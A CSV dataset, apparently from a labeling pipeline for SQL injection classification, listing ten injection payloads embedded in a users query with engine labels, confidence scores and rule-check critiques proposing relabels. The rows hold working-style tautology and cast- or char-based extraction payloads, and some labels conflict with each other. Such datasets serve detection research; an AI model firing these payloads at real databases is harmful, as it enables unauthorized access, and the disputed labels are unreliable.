id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
39544,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-6179 ) ) and ( ( 7732 = 7732""",error_based,oracle,0.8,Oracle WHERE clause injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-6179 ) ) and ( ( 7732 = 7732",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
39545,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,PostgreSQL cast extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
39546,"select * from users WHERE username = ""-7874 ) ) ) and username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap""",error_based,oracle,0.8,Oracle WHERE clause injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-7874 ) ) ) and username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
39547,"select * from users WHERE username = ""-7199\' or \'qibr\' = \'qibr"" and username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,oracle,0.85,Oracle MS SQL char concatenation,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-7199\' or \'qibr\' = \'qibr"" and username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
39548,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'iuki\' = \'iuki"" and username = ""1\'+ ( select onzd where 8452 = 8452",error_based,postgresql,0.85,PostgreSQL cast extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'iuki\' = \'iuki"" and username = ""1\'+ ( select onzd where 8452 = 8452",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
39549,"select * from users WHERE username = ""-1254"" or username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'iuki\' = \'iuki""",error_based,postgresql,0.85,PostgreSQL cast extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'iuki\' = \'iuki,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
39550,"select * from users WHERE username = ""-1641\' ) ) and ( ( ( \'%\' = \'"" and username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'""",error_based,postgresql,0.85,PostgreSQL cast extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \',True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
39551,"select * from users WHERE username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" and username = ""1%"" and ( ( \'ajka\' = \'ajka""",error_based,postgresql,0.85,PostgreSQL cast extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
39552,"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6179 ) )",error_based,postgresql,0.85,PostgreSQL cast extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6179 ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
39553,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'jzpb\' = \'jzpb"" or username = ""-6353%\' ) ) and ( ( \'%\' = \'""",error_based,oracle,0.8,Oracle WHERE clause injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1\' ) ) ) and ( ( ( \'jzpb\' = \'jzpb,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
